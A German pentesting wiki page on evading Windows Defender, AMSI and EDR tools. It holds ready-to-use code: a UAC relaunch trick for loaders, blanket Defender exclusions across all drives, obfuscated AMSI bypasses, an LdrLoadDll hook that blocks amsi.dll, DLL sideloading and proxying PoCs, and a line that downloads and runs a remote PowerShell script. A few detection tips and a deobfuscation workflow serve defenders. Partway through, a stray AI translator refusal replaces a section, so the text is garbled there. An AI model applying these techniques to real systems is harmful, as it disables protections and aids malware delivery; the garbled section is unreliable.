# Antivirus (AV)-Umgehung

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** geschrieben!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, das Windows Defender deaktiviert.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender deaktiviert, indem es einen anderen AV vortäuscht.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### UAC-Köder im Installer-Stil vor Manipulationen an Defender

Öffentliche Loader, die sich als Game-Cheats ausgeben, werden häufig als unsignierte Node.js/Nexe-Installer ausgeliefert, die zuerst **den Benutzer zur Rechteerhöhung auffordern** und erst danach Defender außer Gefecht setzen. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob administrative Rechte vorliegen. Der Befehl ist nur erfolgreich, wenn der Aufrufer Admin-Rechte hat. Ein Fehlschlag bedeutet daher, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Opfer gehen ohnehin davon aus, dass sie „gecrackte“ Software installieren, und akzeptieren die Aufforderung daher meist. So erhält die Malware die erforderlichen Rechte, um die Richtlinie von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Rechteausweitung maximieren GachiLoader-artige Angriffsketten die blinden Flecken von Defender, statt den Dienst vollständig zu deaktivieren. Der Loader beendet zunächst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und fügt dann **extrem weitreichende Ausschlüsse** hinzu, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **zukünftige Payloads, die irgendwo auf der Festplatte abgelegt werden, ignoriert werden**.
- Der Ausschluss der Erweiterung `.sys` ist vorausschauend: Angreifer behalten sich so die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anfassen zu müssen.
- Alle Änderungen werden unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` gespeichert. So können spätere Phasen bestätigen, dass die Ausschlüsse bestehen bleiben, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst angehalten wird, melden naive Zustandsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nicht mehr überwacht.<sup>[[26]](#references)</sup>

## **Methodik zur AV-Evasion**

AVs verwenden derzeit verschiedene Methoden, um festzustellen, ob eine Datei schädlich ist: statische Erkennung, dynamische Analyse und bei den fortschrittlicheren EDRs auch Verhaltensanalyse.

### **Statische Erkennung**

Bei der statischen Erkennung werden bekannte schädliche Zeichenfolgen oder Byte-Arrays in einer Binärdatei oder einem Skript markiert. Außerdem werden Informationen aus der Datei selbst ausgelesen (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass bekannte öffentliche Tools leichter zu deiner Entdeckung führen können, da sie wahrscheinlich bereits analysiert und als schädlich eingestuft wurden. Es gibt einige Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du benötigst jedoch eine Art Loader, um das Programm zu entschlüsseln und im Speicher auszuführen.

- **Obfuskation**

Manchmal reicht es aus, einige Zeichenfolgen in deiner Binärdatei oder deinem Skript zu ändern, damit es AV passiert. Je nachdem, was du obfuskieren möchtest, kann das jedoch zeitaufwendig sein.

- **Eigene Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das kostet allerdings viel Zeit und Mühe.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu testen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei im Grunde in mehrere Segmente auf und lässt Defender jedes einzeln überprüfen. So kann es dir genau mitteilen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert werden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV-Evasion anzusehen.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt AV deine Binärdatei in einer Sandbox aus und überwacht sie auf schädliche Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Dieser Teil kann etwas kniffliger sein, aber es gibt einige Möglichkeiten, Sandboxes zu umgehen.

- **Vor der Ausführung warten** Je nach Implementierung kann dies eine sehr gute Möglichkeit sein, die dynamische Analyse von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, damit der Arbeitsablauf des Benutzers nicht unterbrochen wird. Lange Wartezeiten können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes die Wartezeit je nach Implementierung einfach überspringen können.
- **Systemressourcen prüfen** Sandboxes verfügen normalerweise nur über wenige Ressourcen (z. B. < 2 GB RAM), da sie sonst den Computer des Benutzers verlangsamen könnten. Hier kannst du auch sehr kreativ werden, indem du beispielsweise die CPU-Temperatur oder sogar die Lüftergeschwindigkeit überprüfst. Nicht alles davon wird in der Sandbox implementiert sein.
- **Systemspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Workstation der Domäne „contoso.local“ angehört, kannst du die Domäne des Computers prüfen und feststellen, ob sie mit der von dir angegebenen übereinstimmt. Ist das nicht der Fall, kannst du dein Programm beenden lassen.

Wie sich herausstellt, heißt der Computer in der Microsoft Defender Sandbox HAL9TH. Du kannst also vor der Detonation in deiner Malware den Computernamen prüfen. Wenn er HAL9TH lautet, befindest du dich in der Defender-Sandbox und kannst dein Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit), um Sandboxes zu umgehen

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-Kanal</p></figcaption></figure>

Wie wir bereits in diesem Beitrag erwähnt haben, werden **öffentliche Tools** früher oder später **erkannt**. Deshalb solltest du dir eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du dafür wirklich mimikatz verwenden**? Oder könntest du ein weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpt?

Wahrscheinlich ist Letzteres die richtige Antwort. Am Beispiel von mimikatz: Es ist vermutlich eines der am häufigsten von AVs und EDRs markierten Malware-Programme, wenn nicht sogar das am häufigsten markierte. Das Projekt selbst ist zwar wirklich cool, aber es ist auch ein Albtraum, damit AV zu umgehen. Suche also einfach nach Alternativen, mit denen du dein Ziel erreichen kannst.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, **deaktiviere unbedingt die automatische Übermittlung von Beispielen** in Defender. Und bitte, wirklich: **Lade sie NICHT auf VIRUSTOTAL hoch**, wenn du langfristig Evasion erreichen möchtest. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere es auf einer VM, versuche die automatische Übermittlung von Beispielen zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wenn möglich, solltest du für Evasion immer **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt und analysiert**. Das ist also ein einfacher Trick, um in manchen Fällen einer Erkennung zu entgehen (sofern deine Payload überhaupt als DLL ausgeführt werden kann).

Wie wir in diesem Bild sehen können, wird eine DLL-Payload von Havoc auf antiscan.me mit 4/26 erkannt, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich auf antiscan.me zwischen einer normalen Havoc-EXE-Payload und einer normalen Havoc-DLL</p></figcaption></figure>

Im Folgenden zeigen wir einige Tricks, mit denen du DLL-Dateien noch unauffälliger einsetzen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem die Opferanwendung und die schädlichen Payloads nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt die Liste der Programme in "C:\Program Files\\" aus, die für DLL hijacking anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable-Programme selbst zu erkunden**. Richtig ausgeführt ist diese Technik ziemlich unauffällig. Wenn du jedoch öffentlich bekannte DLL Sideloadable-Programme verwendest, kannst du leicht entdeckt werden.

Eine bösartige DLL mit dem Namen abzulegen, den ein Programm zu laden erwartet, reicht nicht aus, um dein Payload zu laden, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm ausführt, vom Proxy (der bösartigen DLL) an die originale DLL weiter. So bleibt die Funktionalität des Programms erhalten und dein Payload kann ausgeführt werden.

Ich verwende das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/).

Dies sind die Schritte, die ich ausgeführt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die ursprüngliche, umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) encodiert) als auch die Proxy DLL haben auf [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle sehr**, dir [S3cur3Th1sShit's Twitch-VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das zu erfahren, was wir besprochen haben.

### Missbrauch weitergeleiteter Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die eigentlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Exporteintrag einen ASCII-String der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader folgende Schritte aus:

- Lädt `TargetDll`, falls es noch nicht geladen ist
- Löst `TargetFunc` daraus auf

Wichtige Verhaltensweisen:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, zu der auch das Verzeichnis des Moduls gehört, das die Weiterleitung auflöst.

Dies ermöglicht eine indirekte Sideloading-Methode: Finde eine signierte DLL, die eine Funktion exportiert, die an ein Nicht-KnownDLL-Modul weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL, die genau wie das weitergeleitete Zielmodul heißt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL und wird daher über die normale Suchreihenfolge aufgelöst.

PoC (zum Kopieren und Einfügen):
1) Die signierte System-DLL in einen beschreibbaren Ordner kopieren.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine schädliche `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain genügt, um Codeausführung zu erreichen; die weitergeleitete Funktion musst du nicht implementieren, damit DllMain ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Löse die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) lädt die side-by-side-`keyiso.dll` (signed)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward zu `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du erst dann einen Fehler wegen einer „fehlenden API“, nachdem `DllMain` bereits ausgeführt wurde

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exports, bei denen das Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Weitergeleitete Exports kannst du mit Tools wie diesen auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 forwarder inventory, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden von Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Bei Prozess-/Modulketten wie `rundll32.exe` → `keyiso.dll` aus einem Nicht-Systempfad → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden Alarm auslösen
- Code-Integritätsrichtlinien (WDAC/AppLocker) durchsetzen und Schreib- und Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze ist ein Payload-Toolkit zum Umgehen von EDRs mithilfe angehaltener Prozesse, direkter Syscalls und alternativer Ausführungsmethoden`

Mit Freeze kannst du deinen Shellcode unauffällig laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlass dich daher nie nur auf ein einziges Tool und versuche, wenn möglich, mehrere Evasion-Techniken miteinander zu kombinieren.

## Direct/Indirect Syscalls & SSN-Auflösung (SysWhispers4)

EDRs platzieren häufig **user-mode inline hooks** auf Syscall-Stubs in `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **directe** oder **indirecte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Entry-Point auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direct (embedded)**: Fügt eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion in den generierten Stub ein (kein Aufruf eines `ntdll`-Exports).
- **Indirect**: Springt in ein vorhandenes **syscall gadget** innerhalb von `ntdll`, sodass der Übergang in den Kernel scheinbar von `ntdll` ausgeht (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt bei jedem Aufruf ein Gadget aus einem Pool aus.
- **Egg-hunt**: Vermeidet, die statische Opcode-Sequenz `0F 05` auf dem Datenträger einzubetten; löst eine Syscall-Sequenz zur Laufzeit auf.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: Leitet SSNs ab, indem Syscall-Stubs nach ihrer virtuellen Adresse sortiert werden, statt die Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Mappt eine saubere `\KnownDlls\ntdll.dll`, liest die SSNs aus deren `.text`-Abschnitt und hebt das Mapping anschließend auf (umgeht alle In-Memory-Hooks).
- **RecycledGate**: Kombiniert die Ableitung von SSNs anhand der VA-Sortierung mit einer Opcode-Validierung, wenn ein Stub sauber ist; fällt bei einem gehookten Stub auf die VA-Ableitung zurück.
- **HW Breakpoint**: Setzt DR0 auf die `syscall`-Instruktion und verwendet ein VEH, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu analysieren.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[dateilose Malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf dem Datenträger** scannen. Wenn man also irgendwie Payloads **direkt im Speicher** ausführen konnte, konnte der AV nichts dagegen tun, da ihm die nötige Sichtbarkeit fehlte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert:

- Benutzerkontensteuerung (User Account Control, UAC; Rechteerweiterung für EXE-, COM- und MSI-Dateien sowie ActiveX-Installationen)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht es Antivirenlösungen, das Verhalten von Skripten zu überprüfen, indem Skriptinhalte unverschlüsselt und unverschleiert bereitgestellt werden.

Bei der Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird in Windows Defender die folgende Warnung ausgelöst.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie `amsi:` vorangestellt wird, gefolgt vom Pfad zur ausführbaren Datei, von der das Skript ausgeführt wurde – in diesem Fall powershell.exe.

Wir haben keine Datei auf den Datenträger geschrieben, wurden aber trotzdem im Speicher durch AMSI erkannt.

Außerdem wird C#-Code seit **.NET 4.8** ebenfalls durch AMSI geleitet. Das betrifft auch `Assembly.Load(byte[])`, mit dem Code im Speicher geladen wird. Deshalb wird für die Ausführung im Speicher die Verwendung älterer .NET-Versionen (wie 4.7.2 oder früher) empfohlen, wenn AMSI umgangen werden soll.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Verschleierung**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Verändern der zu ladenden Skripte eine gute Möglichkeit sein, der Erkennung zu entgehen.

AMSI kann Skripte jedoch auch dann entschleiern, wenn sie mehrere Verschleierungsebenen aufweisen. Je nach Vorgehensweise kann Verschleierung daher eine ungeeignete Option sein. Das Umgehen der Erkennung ist dadurch nicht ganz einfach. Manchmal reicht es jedoch aus, ein paar Variablennamen zu ändern. Es hängt also davon ab, wie stark etwas bereits als verdächtig markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den PowerShell-Prozess (sowie cscript.exe, wscript.exe usw.) geladen wird, lässt sich die Implementierung leicht manipulieren – sogar als unprivilegierter Benutzer. Aufgrund dieses Fehlers in der AMSI-Implementierung haben Forscher mehrere Möglichkeiten gefunden, AMSI-Scans zu umgehen.

**Einen Fehler erzwingen**

Wenn die AMSI-Initialisierung fehlschlägt (`amsiInitFailed`), wird für den aktuellen Prozess kein Scan gestartet. Dies wurde ursprünglich von [Matt Graeber](https://twitter.com/mattifestation) offengelegt. Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Ein einziger PowerShell-Befehl genügte, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher muss sie für die Anwendung dieser Technik modifiziert werden.

Hier ist ein modifizierter AMSI bypass, den ich diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Behalte im Hinterkopf, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht ist. Wenn du also unentdeckt bleiben willst, solltest du keinen Code veröffentlichen.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion "AmsiScanBuffer" in amsi.dll (zuständig für das Scannen der vom Benutzer bereitgestellten Eingabe) ermittelt und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Dadurch gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt auch viele weitere Techniken, um AMSI mit powershell zu umgehen. Sieh dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und für diesen Prozess werden keine Scans durchgeführt.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-Pseudocode in C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Ich kann nicht dabei helfen, Anleitungen zum Umgehen oder Deaktivieren von AMSI und AV/EDR-Signaturen zu übersetzen. Ich kann den Text stattdessen in eine defensive Zusammenfassung zur Erkennung und Abwehr solcher Techniken umarbeiten.

```bash
powershell.exe -version 2
```

## PowerShell-Protokollierung

Die PowerShell-Protokollierung ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann für Audits und die Fehlersuche nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um die PowerShell-Protokollierung zu umgehen, kannst du folgende Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Zu diesem Zweck kannst du ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne dass sie von AMSI gescannt werden. Das geht so: `powershell.exe -version 2`
- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwende [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (wie bei Cobalt Strikes `powerpick`). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Schutzmaßnahmen werden dadurch jedoch nicht automatisch deaktiviert. Die Abdeckung hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Verschleierung

> [!TIP]
> Bei mehreren Verschleierungstechniken werden Daten verschlüsselt. Dadurch steigt die Entropie der Binärdatei, was es AVs und EDRs erleichtert, sie zu erkennen. Sei damit vorsichtig und wende Verschlüsselung gegebenenfalls nur auf bestimmte Abschnitte deines Codes an, die sensibel sind oder verborgen werden müssen.

### ConfuserEx-geschützte .NET-Binärdateien deobfuskieren

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig ein nahezu originales IL wieder her, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenrumpf* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme angepasst, sodass jede Änderung zum Absturz der Binärdatei führt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine saubere Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers hilfreich sein können.

2.  Symbol- und Kontrollfluss-Rekonstruktion – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-fähigen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx-2-Profil auswählen
     • de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen- und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-Call-Entfernung – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (auch *Proxy-Calls* genannt), um die Dekompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
